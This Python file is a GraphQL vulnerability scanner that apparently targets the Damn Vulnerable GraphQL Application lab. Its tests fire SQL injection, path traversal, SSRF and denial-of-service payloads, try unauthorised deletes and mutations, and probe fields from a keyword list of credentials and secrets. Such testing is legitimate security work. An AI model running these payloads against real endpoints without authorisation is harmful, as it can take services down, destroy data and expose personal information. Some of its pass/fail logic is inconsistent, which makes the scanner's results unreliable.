import requests
import json
from dvga_tests import *

def print_banner():
    banner = r"""
    ========================================================================================================================================================================
    
     ██████  ██████   █████  ██████  ██   ██  ██████  ██          ███████  ██████  █████  ███    ██ ███    ██ ███████ ██████  
    ██       ██   ██ ██   ██ ██   ██ ██   ██ ██    ██ ██          ██      ██      ██   ██ ████   ██ ████   ██ ██      ██   ██ 
    ██   ███ ██████  ███████ ██████  ███████ ██    ██ ██          ███████ ██      ███████ ██ ██  ██ ██ ██  ██ █████   ██████  
    ██    ██ ██   ██ ██   ██ ██      ██   ██ ██ ▄▄ ██ ██               ██ ██      ██   ██ ██  ██ ██ ██  ██ ██ ██      ██   ██ 
     ██████  ██   ██ ██   ██ ██      ██   ██  ██████  ███████     ███████  ██████ ██   ██ ██   ████ ██   ████ ███████ ██   ██ 
                                                ▀▀                                                                           

    ========================================================================================================================================================================
                                                                                                                                                                      
    """
    print(banner)
    print("Welcome to the GRAPHQL Scanner")
    print("This tool tests various GraphQL security vulnerabilities on specified endpoints.\n")


# GRAPHQL_URL = "http://127.0.0.1:31337/index.php?graphql"

# Define the GraphQL endpoint URL
def load_endpoints(filename):
    with open(filename, "r") as file:
        for line in file:
            yield json.loads(line)['url']


def print_red(text):
    print("\033[91m{}\033[0m".format(text))

def print_green(text):
    print("\033[92m{}\033[0m".format(text))

def check_resource_request(url):
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}

    try:
        response = requests.post(url, json=resource_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and '__type' in response_json['data']:
            # print_red("[!] Excessive resource request vulnerability found at {}".format(url))
            # print("Evidence:", json.dumps(response_json, indent=4))
            return "Excessive resource request vulnerability failed"
        else:
            # print_green("[-] No excessive resource request vulnerability found at {}".format(url))
            return "Excessive resource request vulnerability successful"
    except Exception as e:
        print("Error during resource request check:", e)

def test_dos_attack(url):
    query = "query { systemUpdate }" * 100 
    print("Running DoS attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(url, json={"query": query})
            status_codes.append(response.status_code)
        # print_green("[+] DoS attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            # print_green("[+] DoS attack test successful.")
            return "DoS attack test successful"
        else:
            # print_red("[-] DoS attack test failed: Server responded with 200 status code.")
            return "DoS attack test failed"
    except Exception as e:
        print_green("[-] DoS attack test failed: {}".format(e))

def test_alias_attack(url):
    query_list = []
    for i in range(100):
        alias = f"q{i}: systemUpdate"
        query_list.append(alias)

    query = "\n".join(query_list)
    print("Running alias-based attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(url, json={"query": query})
            status_codes.append(response.status_code)
        # print_green("[+] Alias-based attack test status codes: {}".format(status_codes))
        if 200 not in status_codes:
            # print_green("[+] Alias-based attack test successful.")
            return " Alias-based attack test successful"
        else:
            # print_red("[-] Alias-based attack test failed: Server responded with 200 status code.")
            return " Alias-based attack test failed"

    except Exception as e:
        print_green("[-] Alias-based attack test failed: {}".format(e))

def test_sensitive_data(url):
    sensitive_fields = [
        'email',
        'password',
        'creditCardNumber',
    ]

    print("Running sensitive data test...")
    try:
        for field in sensitive_fields:
            sensitive_query = {
                'query': f'''
                {{
                    search(query: "{field}") {{
                        id
                        {field}
                    }}
                }}
                '''
            }
            response = requests.post(url, json=sensitive_query)
            response.raise_for_status()
            response_json = response.json()

            if 'data' in response_json and 'search' in response_json['data']:
                # print_red("[!] Sensitive data leak detected in field: {}".format(field))
                # print("Evidence:", json.dumps(response_json, indent=4))
                return "Sensitive data leak test failed"
            else:
                # print_green("[-] No sensitive data leak detected in field: {}".format(field))
                return "Sensitive data leak test successful"
    except Exception as e:
        # print("Error during sensitive data test:", e)
        return "Sensitive data leak test not applicable"

def test_deep_recursion_attack(url):
    deep_query = 'query { user { friends { friends { friends { id } } } } }'
    try:
        response = requests.post(url, json={"query": deep_query})
        if response.status_code == 200:
            # print_red("[-] Deep recursion query handling may be inadequate.")
            return "Deep recursion query handling test failed"
        else:
            # print_green("[+] Server managed deep recursion safely.")
            return "Deep recursion query handling test successful"
    except Exception as e:
        print_red(f"[-] Deep recursion test failed: {e}")

def test_ssrf_vulnerability(url):
    # Mutation query attempting to access a potentially private internal service
    ssrf_query = """
    mutation {
      importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': ssrf_query}

    try:
        print("Running SSRF attack test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            # print_red("[!] SSRF attack may be possible.")
            # print("Response data:", response.json())
            return "SSRF attack test successful"
        else:
            # print_green(f"[-] SSRF attack test failed with status code: {response.status_code}")
            return "SSRF attack test failed"
    except Exception as e:
        print_red(f"Failed to send SSRF test request: {e}")

def test_sql_injection(url):
    sql_injection_query = """
    query {
      pastes(filter:"aaa ' or 1=1--") {
          content
          title
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sql_injection_query}

    try:
        print("Running SQL injection test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200 and 'data' in response.json():
            # print_red("[!] SQL injection may be possible.")
            # print("Response data:", response.json())
            return "SQL injection test failed"
        else:
            # print_green(f"[-] SQL injection test did not execute with usual symptoms, status code: {response.status_code}")
            return "SQL injection test successful"
    except Exception as e:
        print_red(f"Failed to send SQL injection test request: {e}")


def test_path_traversal(url):
    path_traversal_query = """
    mutation {
      uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': path_traversal_query}

    try:
        print("Running path traversal test...")
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('data') and response_data['data']['uploadPaste']['result']:
                # print_red("[!] Path traversal attack may be possible.")
                return "Path traversal attack test successful"
                # print("Response data:", response_data)
            else:
                # print_green("[-] Path traversal test did not execute successfully, status code: {response.status_code}")
                return "Path traversal attack test failed"
        else:
            # print_green(f"[-] Path traversal test failed with status code: {response.status_code}")
            return "Path traversal attack test successful"
    except Exception as e:
        # print_red(f"Failed to send path traversal test request: {e}")
        return "Path traversal test not applicable"


def test_permissions(url):
    sensitive_query = """
    mutation {
      deleteUser(userId: "12345") {
        result
      }
    }
    """
    headers = {'Content-Type': 'application/json'}
    payload = {'query': sensitive_query}

    print("Running permissions test...")
    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 403 or response.status_code == 401:
        # print_green("[+] Proper authorization checks are in place.")
        return "Proper authorization checks test successful"
    else:
        # print_red("[-] Permissions test failed, unauthorized actions might be possible.")
        return "Proper authorization checks test failed"

def test_introspection(url):
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                }
                directives {
                    name
                }
            }
        }
        """
    }
    headers = {'Content-Type': 'application/json'}
    print("Running introspection test...")
    try:
        response = requests.post(url, json=introspection_query, headers=headers)
        response.raise_for_status()  
        data = response.json()
        if data.get('data', {}).get('__schema'):
            # print_red("[-] Introspection is enabled and could leak sensitive schema information.")
            return "Introspection test failed, could leak sensitive information"
        else:
            # print_green("[+] Introspection is properly restricted.")
            return "Introspection test successful"
    except requests.exceptions.HTTPError as err:
        print_red(f"HTTP error occurred: {err}")
    except requests.exceptions.RequestException as e:
        print_red(f"An error occurred during the request: {e}")
    except ValueError:
        print_red("Failed to decode JSON from response.")

def test_getUsers(url):
    getUsers_query = {
        'query': '''
        query getUsers{
          users(where:{role:ADMINISTRATOR}){
            edges{
              node{
                userId
                name
              }
            }
          }
        }
        '''
    }

    try:
        response = requests.post(url, json=getUsers_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and 'users' in response_json['data']:
            # print_green("[+] getUsers testcase successfully executed.")
            return "Get users test successful"
            # print("Response:", json.dumps(response_json, indent=4))
        else:
            # print_red("[-] getUsers testcase failed.")
            return "Get users test failed"
    except Exception as e:
        # print("Error during getUsers testcase execution:", e)
        return "Get users test not applicable"

def test_denialOfService(url):
    FORCE_MULTIPLIER = 10000
    CHAINED_REQUESTS = 1000

    queries = []

    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}

    for _ in range(0, CHAINED_REQUESTS):
        queries.append(query)

    r = requests.post(url, json=queries)
    # print_green("[+] denialOfService testcase successfully executed.")
    return "denialOfService test successful. Time took {} seconds".format(r.elapsed.total_seconds())
    # print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
    # print('Response:', r.json())

def post_comment(url, headers, postID, userID, comment, verbose=False):
    payload = {
        "query": """
            mutation {
                createComment(input: {
                    postId: %d,
                    userId: %d,
                    content: "%s",
                    clientMutationId: "UWHATM8",
                }) {
                    clientMutationId
                }
            }
        """ % (int(postID), int(userID), comment)
    }
    
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if response.status_code == 200 and 'UWHATM8' in response.text:
            # print_green("[+] Comment posted on article ID")
            return "Unauthorized comments test successful"
        else:
            # print_red("\n[-] Error posting the comment. Check that postID and userID are correct")
            return "Unauthorized comments test failed"

        if verbose:
            print(response.text)

            return
    except Exception as e:
        print_red("\n[-] An error occurred while posting the comment")

        return
    
def test_unauthorized_comment(url):
    headers = {
        'Content-Type': 'application/json',
    }
    postID = "1" 
    userID = "2" 
    comment = "This is a test comment."  # Comment to be posted
    post_comment(url, headers, postID, userID, comment, verbose=True)

# checks the server's ability to handle multiple, resource-intensive queries
def test_batching_attack(url):
    batch_queries = [{'query': '{ users { id, posts { id, title, comments { id, content } } } }'} for _ in range(50)]
    try:
        response = requests.post(url, json=batch_queries)
        if response.status_code == 200:
            # print_red("[!] Batching attack may be possible. Server responded with 200 OK.")
            return "Batching attack test failed"
        else:
            # print_green("[-] Batching attack mitigated. Response status: {}".format(response.status_code))
            return "Batching attack test successful"
    except Exception as e:
        print_red("[-] Batching attack test failed: {}".format(e))

def test_field_limiting(url):
    # Attempt to request an excessive number of fields
    query = 'query { user { ' + ' '.join(f'field{i}' for i in range(1000)) + ' } }'
    try:
        response = requests.post(GRAPHQL_URL, json={"query": query})
        if response.status_code == 400 and 'too many fields' in response.text.lower():
            # print_green("[+] Field limiting is enforced.")
            return "Field limiting test successful"
        else:
            # print_red("[-] No field limiting detected, potential vulnerability.")
            return "Field limiting test failed"
    except Exception as e:
        # print_red(f"[-] Field limiting test failed: {e}")
        return "Field limiting test not applicable"


def test_unauthorized_mutation(url):
    mutation = 'mutation { updatePost(id: "1", data: { title: "New Title" }) { title } }'
    try:
        response = requests.post(url, json={"query": mutation})
        if response.status_code in [200, 201] and "title" in response.json().get('data', {}):
            # print_red("[!] Unauthorized mutation may be possible.")
            return "Unauthorized mutation test failed"
        else:
            # print_green("[-] Mutation properly restricted.")
            return "Unauthorized mutation test successful"
    except Exception as e:
        print_red(f"[-] Mutation test failed: {e}")

def test_sensitive_data_dynamically(url, schema):
    """ Dynamically test for sensitive data based on schema introspection. """
    sensitive_keywords = [
        'password', 'passcode', 'passwd', 'pin', 'creditcard', 'ccnumber', 'cardnum', 'ssn', 'socialsecuritynumber', 
        'secret', 'token', 'apikey', 'api_key', 'accesstoken', 'access_token', 'auth', 'authentication', 'credentials',
        'privatekey', 'private_key', 'secretkey', 'secret_key', 'encryptionkey', 'encryption_key', 
        'bank', 'accountnumber', 'account_num', 'routingnumber', 'routing_num', 'financial', 
        'salary', 'birthdate', 'birthplace', 'passportnumber', 'passport_num', 'driverlicense', 'driver_license_num',
        'address', 'email', 'phone', 'phonenumber', 'mobile', 'cell', 'contact', 'zip', 'postal', 'postcode', 
        'signature', 'profile', 'ssn', 'dni', 'nationalid', 'national_id', 'taxid', 'tax_id', 'health', 'insurance',
        'beneficiary', 'beneficiary_id', 'custodian', 'guardian', 'sessionid', 'session_id', 'cookie', 'authentication_token'
    ]

    sensitive_fields = []

    # Identify potentially sensitive fields from the schema
    for type_info in schema:
        if type_info.get('fields'):
            for field in type_info['fields']:
                if any(keyword in field['name'].lower() for keyword in sensitive_keywords):
                    sensitive_fields.append(f"{type_info['name']}{{ {field['name']} }}")

    # Test each sensitive field found
    print("Running dynamic sensitive data tests...")
    for query in sensitive_fields:
        try:
            response = requests.post(url, json={'query': '{ ' + query + ' }'}, headers={'Content-Type': 'application/json'})
            if response.status_code == 200 and response.json().get('data'):
                print_red(f"[!] Sensitive data leak detected in field: {query}")
                print("Evidence:", json.dumps(response.json(), indent=4))
            else:
                print_green(f"[-] No sensitive data leak detected in field: {query}")
        except Exception as e:
            print("Error during sensitive data test:", e)

def get_nested_fields(field, depth=0, max_depth=2):
    """ Recursively get nested fields if the field is of type OBJECT. """
    if depth > max_depth:
        return ""
    fields = ""
    if field.get('type').get('kind') == 'OBJECT':
        nested_fields = field['type'].get('fields', [])
        for nested_field in nested_fields:
            fields += f"{nested_field['name']} {get_nested_fields(nested_field, depth + 1, max_depth)}, "
    elif field.get('type').get('kind') == 'NON_NULL' or field.get('type').get('kind') == 'LIST':
        return get_nested_fields({'type': field['type']['ofType']}, depth, max_depth)
    return fields

def fetch_schema(url):
    """ Fetch the GraphQL schema via introspection. """
    introspection_query = {
        "query": """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType {
                                name
                                kind
                            }
                        }
                    }
                }
                directives {
                    name
                }
            }
        }
        """
    }
    try:
        response = requests.post(url, json=introspection_query, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        return response.json()['data']['__schema']['types']
    except Exception as e:
        print_red(f"Failed to fetch schema: {e}")
        return []
    



if __name__ == "__main__":
    print_banner()
    choice = input("Do you want to enter an endpoint manually or use a JSON file? Enter 'manual' or 'json': ").strip().lower()
    
    if choice == 'manual':
        # Single endpoint provided by the user
        GRAPHQL_URL = input("Enter the GraphQL endpoint URL: ")
        endpoints = [GRAPHQL_URL]  
    elif choice == 'json':
        endpoints = load_endpoints("./valid_endpoints.json")
    else:
        print("Invalid choice. Exiting.")
        exit()

    for url in endpoints:
        GRAPHQL_URL = url
        print(f"Running test cases on {url}...")
        test_introspection(url)
        check_resource_request(url)
        test_dos_attack(url)
        test_alias_attack(url)
        test_sensitive_data(url)
        test_deep_recursion_attack(url)
        test_ssrf_vulnerability(url)
        test_sql_injection(url)
        test_path_traversal(url)
        test_permissions(url)
        test_getUsers(url)
        test_unauthorized_comment(url)
        test_batching_attack(url)
        test_field_limiting(url)
        test_unauthorized_mutation(url)


        # test_capitalize_field_argument()
        # test_show_network_directive()
        # test_mutation_login_success()
        # test_mutation_login_error()
        # test_query_me()
        # test_query_me_operator()
        # test_batching()
        # test_batched_operation_names()
        # test_check_graphiql_cookie()
        # test_check_batch_disabled()
        # test_check_batch_enabled()
        # test_dvga_is_up()
        # test_graphql_endpoint_up()
        # test_graphiql_endpoint_up()
        # test_check_introspect_fields()
        # test_check_introspect_when_expert_mode()
        # test_check_introspect_mutations()
        # test_check_hardened_mode()
        # test_check_easy_mode()
        # test_mutation_createPaste()
        # test_mutation_editPaste()
        # test_mutation_deletePaste()
        # test_mutation_uploadPaste()
        # test_mutation_importPaste()
        # test_mutation_createUser()
        # test_mutation_createBurnPaste()
        # test_query_pastes()
        # test_query_paste_by_id()
        # test_query_systemHealth()
        # test_query_systemUpdate()
        # test_query_systemDebug()
        # test_query_users()
        # test_query_users_by_id()
        # test_query_read_and_burn()
        # test_query_search_on_user_object()
        # test_query_search_on_paste_object()
        # test_query_search_on_user_and_paste_object()
        # test_query_audits()
        # test_query_audits()
        # test_query_pastes_with_limit()
        # test_query_pastes_with_fragments()
        # test_check_rollback()
        # test_circular_query_pastes_owners()
        # test_aliases_overloading()
        # test_field_suggestions()
        # test_os_injection()
        # test_os_injection_alt()
        # test_xss()
        # test_log_injection()
        # test_html_injection()
        # test_sql_injection()
        # test_deny_list_expert_mode()
        # test_deny_list_expert_mode_bypass()
        # test_deny_list_beginner_mode()
        # test_circular_fragments()
        # test_stack_trace_errors()
        # test_check_websocket()
